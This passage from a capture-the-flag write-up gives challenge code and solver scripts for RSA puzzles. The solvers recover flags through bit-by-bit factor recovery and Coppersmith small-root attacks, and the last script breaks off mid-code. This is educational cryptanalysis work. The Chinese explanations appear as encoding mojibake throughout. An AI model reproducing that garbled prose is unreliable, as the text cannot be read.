2^k$ï¼Œè‹¥åªåœ¨æŸä¸ªå€™é€‰ bit ä¸‹æˆç«‹ï¼Œå°±ç¡®å®šè¿™ä¸€ä½ã€‚</li><li>è¿™æ ·ä» bit 64 æ¨åˆ° bit 127ï¼Œå†åŒç†ä» 128 æ¨åˆ° 255ï¼Œå¯ä»¥é€ä½å”¯ä¸€æ¢å¤æ•´ä¸ª 256-bit çš„ sã€‚</li></ol><p>æ‹¿åˆ°å®Œæ•´çš„ s åï¼š</p><ul><li>ç”¨ç»™å®šçš„ <code>tran</code> æ„é€  (p)ï¼›</li><li>ç”¨ <code>q_bin = A + 1â€¦1 + B + 1â€¦1</code> æ„é€  (q)ï¼›</li><li>éªŒè¯ pã€q ä¸ºç´ æ•°ä¸” $pq == n$ã€‚</li></ul><p>æœ€åå¸¸è§„ RSA è§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">97500437901440388417198788454954892885829765317271438600836638419723842224011100091990654907349042873594131382232421640267091732569264390052236076620148372084122607139079558728860385251369576795723604753566616558793072715394596559965112752835650808765911364805382628147988309718393764596614456741590220757591</span></span><br><span class="line">c = <span class="number">7738615614182124736230909980262535479827406389377664909203540758689122759528168600427345931034997504030657746278863273550729288326235414854206217548620396163736109673531409510422631464901846302450760457216706035370273167926580473904029057693564485585891556568420324605915383565319685765532478198539656924536</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">nbit = <span class="number">256</span>   <span class="comment"># s çš„æ¯”ç‰¹é•¿åº¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= éƒ¨åˆ†æ„é€ æ¢å¤ =========</span></span><br><span class="line"><span class="comment"># s çš„ bit ç¼–å·ç»Ÿä¸€ç”¨ LSB ä¼˜å…ˆï¼šs = sum s_i * 2^i, i=0 æ˜¯æœ€ä½ä½</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_low_from_s</span>(<span class="params">s_low, L</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    å·²çŸ¥ s çš„ä½ä½ bit 0..Lï¼ˆå…± L+1 ä½ï¼Œæ‰“åŒ…åœ¨ s_lowï¼‰,</span></span><br><span class="line"><span class="string">    è®¡ç®— p = tran(s) åœ¨ 2^(2*(L+1)) æ¨¡ä¸‹çš„å€¼ï¼ˆå³ p çš„ä½ 2*(L+1) ä½ï¼‰</span></span><br><span class="line"><span class="string">    åˆ©ç”¨æ˜ å°„ï¼šå¯¹ i=0..Lï¼Œæœ‰</span></span><br><span class="line"><span class="string">        p_bit[2*i]   = s_i</span></span><br><span class="line"><span class="string">        p_bit[2*i+1] = 1 - s_i</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L + <span class="number">1</span>):</span><br><span class="line">        bit = (s_low &gt;&gt; i) &amp; <span class="number">1</span></span><br><span class="line">        p |= bit &lt;&lt; (<span class="number">2</span> * i)</span><br><span class="line">        p |= (<span class="number">1</span> - bit) &lt;&lt; (<span class="number">2</span> * i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q_low_from_s</span>(<span class="params">s_low, L</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    å·²çŸ¥ s çš„ä½ä½ bit 0..Lï¼Œè®¡ç®— q åœ¨ 2^(2*(L+1)) æ¨¡ä¸‹çš„å€¼ã€‚</span></span><br><span class="line"><span class="string">    q çš„ç»“æ„ï¼ˆnbit=256ï¼‰ï¼š</span></span><br><span class="line"><span class="string">        q_bin = A (128) | B=1^128 | C (128) | D=1^128</span></span><br><span class="line"><span class="string">    ä» LSB çœ‹ï¼š</span></span><br><span class="line"><span class="string">        bits 0..127   : å…¨æ˜¯ 1ï¼ˆDï¼‰</span></span><br><span class="line"><span class="string">        bits 128..255 : æ­£å¥½æ˜¯ s çš„ä½ 128 ä½ï¼ˆCï¼‰</span></span><br><span class="line"><span class="string">        bits 256..383 : å…¨æ˜¯ 1ï¼ˆBï¼‰</span></span><br><span class="line"><span class="string">        bits 384..511 : s çš„é«˜ 128 ä½ï¼ˆAï¼‰</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    åªéœ€è¦ q çš„ä½ 2*(L+1) ä½ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    kmax = <span class="number">2</span> * (L + <span class="number">1</span>)      <span class="comment"># è¦æ±‚çš„ bit æ•°ï¼Œç´¢å¼•èŒƒå›´ 0..kmax-1</span></span><br><span class="line">    q = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(kmax):</span><br><span class="line">        <span class="keyword">if</span> k &lt; <span class="number">128</span>:</span><br><span class="line">            <span class="comment"># è½åœ¨ D æ®µ</span></span><br><span class="line">            qb = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> k &lt; <span class="number">256</span>:</span><br><span class="line">            <span class="comment"># è½åœ¨ C æ®µï¼Œå¯¹åº” s_bit[k-128]</span></span><br><span class="line">            idx = k - <span class="number">128</span></span><br><span class="line">            qb = (s_low &gt;&gt; idx) &amp; <span class="number">1</span> <span class="keyword">if</span> idx &lt;= L <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> k &lt; <span class="number">384</span>:</span><br><span class="line">            <span class="comment"># è½åœ¨ B æ®µï¼Œåˆæ˜¯ 1</span></span><br><span class="line">            qb = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># è½åœ¨ A æ®µï¼Œå¯¹åº” s_bit[k-256]ï¼ˆé«˜ 128 ä½ï¼‰</span></span><br><span class="line">            idx = k - <span class="number">256</span></span><br><span class="line">            qb = (s_low &gt;&gt; idx) &amp; <span class="number">1</span> <span class="keyword">if</span> idx &lt;= L <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        q |= qb &lt;&lt; k</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_s</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    åˆ©ç”¨ç­‰å¼ n = p * qï¼ˆmod 2^(2*(L+1)))ï¼‰é€ bit æ¢å¤ s çš„ LSB-&gt;MSBï¼ˆé™¤äº†æœ€é«˜ä½ï¼‰ã€‚</span></span><br><span class="line"><span class="string">    å¯¹äºæ¯ä¸€ä½ iï¼Œåªå°è¯• 0/1ï¼Œä¸¤ç§å€™é€‰ä¸­åªæœ‰ä¸€ä¸ªèƒ½æ»¡è¶³å½“å‰æ¨¡ 2^(2*(i+1)) çš„ä¹˜æ³•å…³ç³»ã€‚</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s_low = <span class="number">0</span></span><br><span class="line">    <span class="comment"># åªæ¢å¤ 0..254 å…± 255 ä½ï¼Œæœ€é«˜ä½ bit_255 é»˜è®¤æ˜¯ 1ï¼ˆ256-bit primeï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        L = bit</span><br><span class="line">        mod = <span class="number">1</span> &lt;&lt; (<span class="number">2</span> * (L + <span class="number">1</span>))</span><br><span class="line">        mask = mod - <span class="number">1</span></span><br><span class="line">        n_mod = n &amp; mask</span><br><span class="line"></span><br><span class="line">        good = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">            cand = s_low | (b &lt;&lt; bit)</span><br><span class="line">            p_low = p_low_from_s(cand, L)</span><br><span class="line">            q_low = q_low_from_s(cand, L)</span><br><span class="line">            <span class="keyword">if</span> (p_low * q_low) &amp; mask == n_mod:</span><br><span class="line">                <span class="keyword">if</span> good <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;bit <span class="subst">&#123;bit&#125;</span>: å‡ºç°äº†ä¸¤ä¸ªå€™é€‰ï¼Œç†è®ºä¸Šä¸è¯¥å‘ç”Ÿ&quot;</span>)</span><br><span class="line">                good = cand</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> good <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;bit <span class="subst">&#123;bit&#125;</span>: æ²¡æœ‰æ»¡è¶³æ¡ä»¶çš„å€™é€‰ï¼Œè¯´æ˜é€»è¾‘æœ‰é—®é¢˜&quot;</span>)</span><br><span class="line">        s_low = good</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æœ€é«˜ä½ bit_255 å¿…ä¸º 1ï¼ˆ256-bit primeï¼‰</span></span><br><span class="line">    <span class="keyword">return</span> s_low | (<span class="number">1</span> &lt;&lt; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========= æ¢å¤ s -&gt; p, q =========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tran</span>(<span class="params">s</span>):</span><br><span class="line">    s_bin = <span class="built_in">bin</span>(s)[<span class="number">2</span>:]</span><br><span class="line">    bit_map = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;01&#x27;</span>&#125;</span><br><span class="line">    p_bin = <span class="string">&#x27;11&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(bit_map[bit] <span class="keyword">for</span> bit <span class="keyword">in</span> s_bin[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p_bin, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_q</span>(<span class="params">s</span>):</span><br><span class="line">    s_bin = <span class="built_in">bin</span>(s)[<span class="number">2</span>:].zfill(nbit)</span><br><span class="line">    q_bin = (s_bin[:nbit // <span class="number">2</span>] +</span><br><span class="line">             <span class="string">&#x27;1&#x27;</span> * (nbit // <span class="number">2</span>) +</span><br><span class="line">             s_bin[nbit // <span class="number">2</span>:] +</span><br><span class="line">             <span class="string">&#x27;1&#x27;</span> * (nbit // <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(q_bin, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1. æ¢å¤ s</span></span><br><span class="line">    s = recover_s()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] recovered s =&quot;</span>, s)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. è¿˜åŸ p, q</span></span><br><span class="line">    p = tran(s)</span><br><span class="line">    q = gen_q(s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] check p * q == n:&quot;</span>, p * q == n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. å¸¸è§„ RSA è§£å¯†</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] flag =&quot;</span>, flag)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># recovered s = 68877671281748244354168774399219985559719625978037270512203331871457990617649</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;n1ce_th1s_RSA_I_can_do_it&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h3><blockquote><p>Make a decison</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;_______________________________&#125;&quot;</span></span><br><span class="line">m = <span class="built_in">bin</span>(bytes_to_long(flag.encode()))[<span class="number">2</span>:]</span><br><span class="line">p = getPrime(<span class="number">300</span>)</span><br><span class="line">q = getPrime(<span class="number">300</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">m</span>):</span><br><span class="line"> C = []</span><br><span class="line"> <span class="keyword">for</span> bit <span class="keyword">in</span> m:</span><br><span class="line">     <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         C.append(random.randint(<span class="number">1</span>, n-<span class="number">1</span>))</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         x = random.randint(<span class="number">1</span>, <span class="number">2</span>^<span class="number">80</span>)</span><br><span class="line">         y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">         val = <span class="number">65537</span> + x*(<span class="number">1</span>-x) +(q - x)*y + (y + x)*(q + x)</span><br><span class="line">         C.append(R(val))</span><br><span class="line"> <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line">c = gen(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>flagè¢«è½¬æ¢æˆäºŒè¿›åˆ¶å­—ç¬¦ä¸² <code>m</code>ï¼Œç„¶åé€šè¿‡ <code>gen(m)</code> ç”Ÿæˆäº†ä¸€ä¸ªåˆ—è¡¨ <code>c</code>ã€‚ä»ä»£ç æ¥çœ‹ï¼Œå®ƒå¯¹æ¯ä¸ª bit åšäº†ä¸åŒå¤„ç†ï¼š</p><p><strong>bit ä¸º 0</strong>ï¼š</p><p><code>C.append(random.randint(1, n-1))</code></p><p>ç›´æ¥ç”Ÿæˆéšæœºæ•°ï¼Œæ²¡æœ‰åŒ…å« p/q çš„ä¿¡æ¯ã€‚</p><p><strong>bit ä¸º 1</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = random.randint(<span class="number">1</span>, <span class="number">2</span>^<span class="number">80</span>)</span><br><span class="line">y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">val = <span class="number">65537</span> + x*(<span class="number">1</span>-x) +(q - x)*y + (y + x)*(q + x)</span><br><span class="line">C.append(R(val))</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„ <code>val</code> ä¸­æ¶‰åŠ pã€qã€xã€yï¼Œå³åªæœ‰ bit=1 æ—¶çš„å¤šé¡¹å¼ä¼šåŒ…å« <code>p</code> æˆ–è€… <code>q</code> çš„ä¿¡æ¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val = 65537 + x*(1-x) + (q - x)*y + (y + x)*(q + x)</span><br></pre></td></tr></table></figure><p>å±•å¼€ <code>(y+x)*(q+x)</code>ï¼š</p><p>$(y+x)(q+x) = yq + yx + qx + x^2$</p><p>å†åŠ ä¸Š <code>(q-x)*y = q*y - x*y</code></p><p>æ‰€ä»¥ï¼š</p><p>$val = 65537 + x(1-x) + qy - xy + yq + yx + qx + x^2 = 65537 + x + q(x + 2y)$</p><p>åˆ©ç”¨ $val \equiv 65537 + x \pmod q$</p><p>ä½¿ç”¨coppersmithæ±‚ $x$ï¼Œæœ‰æ ¹è¯´æ˜è¯¥bitæ˜¯1ï¼Œå¦åˆ™æ˜¯0ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">2526599011415278649561261573052763157484362530430898703481695632630586539786168078485198684339678077901262480513358055486858753591082500336800269435444902149482534314670847199200591</span></span><br><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="built_in">len</span>(c)):</span><br><span class="line">    f = <span class="number">65537</span> + x - c[i]</span><br><span class="line">    root = f.small_roots(X=<span class="number">2</span>^<span class="number">80</span>, beta=<span class="number">0.48</span>)</span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;where_1s_th5_flag_where&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="StillRSA"><a href="#StillRSA" class="headerlink" title="StillRSA"></a>StillRSA</h3><blockquote><p>A easy coppersmith</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line"> <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">     p1 = getPrime(<span class="number">128</span>)</span><br><span class="line">     p2 = getPrime(<span class="number">512</span>)</span><br><span class="line">     q2 = getPrime(<span class="number">512</span>)</span><br><span class="line">     s = q2 &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">56</span>) - <span class="number">1</span>)</span><br><span class="line">     q1 = <span class="number">2</span> * p1 + s</span><br><span class="line">     r1 = <span class="number">2</span> * q1 + s</span><br><span class="line">     <span class="keyword">if</span> is_prime(q1) <span class="keyword">and</span> is_prime(r1):</span><br><span class="line">         n1 = p1 * q1 * r1</span><br><span class="line">         n2 = p2 * q2</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"> <span class="keyword">return</span> n1,n2,p1,p2</span><br><span class="line"></span><br><span class="line">n1,n2, p1, p2 = gen()</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;---------------------------------------&#125;&quot;</span>.encode()</span><br><span class="line">m1 = bytes_to_long(flag[: (<span class="built_in">len</span>(flag)+<span class="number">1</span>) // <span class="number">2</span>])</span><br><span class="line">m2 = bytes_to_long(flag[(<span class="built_in">len</span>(flag)+<span class="number">1</span>) // <span class="number">2</span> :])</span><br><span class="line"></span><br><span class="line">c1 = powmod(m1, e, n1)</span><br><span class="line">c2 = powmod(m2, e, n2)</span><br><span class="line"></span><br><span class="line">gift = p2 &gt;&gt; <span class="number">262</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1 = <span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2 = <span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p1 = <span class="subst">&#123;p1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;gift = <span class="subst">&#123;gift&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>é¢˜ç›®ç”Ÿæˆ $n_1 = p_1q_1r_1$ï¼Œä¸”ï¼š</p><p>$q_1 = 2p_1 + s$ï¼Œ$r_1 = 2q_1 + s = 4p_1 + 3s$</p><p>å…¶ä¸­ <code>s = q2 &amp; ((1 &lt;&lt; 56) - 1)</code>ï¼ˆå³ q2 çš„ä½ 56 ä½ï¼‰ã€‚</p><p>ç”±æ­¤ä»¤ $N = n_1 // p_1 = q_1r_1$ï¼Œä»£å…¥å¾—åˆ°ï¼š</p><p>$N = q_1r_1 = q_1(2q_1 + s) = 2q_1^2 + sq_1$</p><p>ä¸¤è¾¹å¯¹ $p_1$ å–æ¨¡ï¼Œå¯å¯¼å‡ºæ¨¡ $p_1$ çš„äºŒæ¬¡æ–¹ç¨‹æ¥æ±‚ $s$ï¼Œ ç®€åŒ–å¾—åˆ°ï¼š</p><p>$N \equiv 3s^2 \pmod {p_1}$</p><p>å¯ä»¥ç®—å‡º $s^2 \bmod {p_1}$ï¼Œå†æ±‚æœ‰é™åŸŸå¼€æ–¹å¾—åˆ° $s$ï¼Œå³å¯æ¢å¤ $q_1,r_1$ï¼Œä»è€Œå®Œæ•´åˆ†è§£ $n_1$ï¼Œè§£å¯† $c_1$ã€‚</p><p>ç¬¬äºŒéƒ¨åˆ†ç”¨ $n_2 = p_2q_2$ åŠ å¯†ã€‚å·²çŸ¥ $p_2$ çš„é«˜ä½ 250 bitï¼Œåˆç”± <code>s = q2 &amp; ((1&lt;&lt;56)-1)</code>ï¼Œè¿˜å¯ç®—å‡º $p_2 \bmod {2^{56}}$ã€‚</p><p>æ‰€ä»¥å·²çŸ¥ $p_2$ çš„é«˜ 250 bit å’Œä½ 56 bitï¼Œç”¨coppersmithæ±‚ä¸­é—´éƒ¨åˆ†bitã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">153535945724301761635048132162798014938917969845079448489545851494873442295873133893384411532854581537976576911336083</span></span><br><span class="line">n2 = <span class="number">84803188245030813883191077133506154725049469687779805365997839479650548017159380111143407950887981137367898417071670318175553216747909857623397932606557900805065642334402683077054566841962022705300815246585360967197421835628665369002004215185956537117678561509558467837953178340079218753108643544534307300779</span></span><br><span class="line">c1 = <span class="number">91344805342373294041484814707589753503672726499268929615405258196853851463816933913580106446612439099622637694719344</span></span><br><span class="line">c2 = <span class="number">65030067863230521561732635665855986696538207379818716373900645903663706519394086998921178373079966943522635174648820466855368885032783946013202871621053763074374114131710373913193434831822631037825109588592562599802388631816046111419285162200967000421088941791542557891726383026274591733889350668008350880276</span></span><br><span class="line">p1 = <span class="number">267735952598198080786845163083151774667</span></span><br><span class="line">gift = <span class="number">1068605981024067598428983610552162240530726981658336444437430658822896756780</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line">N = n1 // p1</span><br><span class="line">s2 = N * inverse(<span class="number">3</span>, p1)</span><br><span class="line">s = <span class="built_in">int</span>(mod(s2, p1).nth_root(<span class="number">2</span>))</span><br><span class="line"><span 